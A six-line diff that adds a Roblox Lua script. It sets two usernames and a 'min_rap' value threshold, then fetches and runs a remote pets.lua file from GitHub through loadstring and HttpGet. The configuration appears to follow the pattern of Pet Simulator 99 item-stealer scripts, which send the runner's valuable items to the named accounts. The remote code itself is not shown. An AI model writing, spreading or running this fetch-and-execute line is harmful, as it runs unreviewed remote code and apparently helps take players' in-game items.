@@ -1,0 +1,6 @@
+Username = "PrestonTheOneWho"
+Username2 = "IcatchEXpokemon"
+Support = false
+min_rap = 500000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
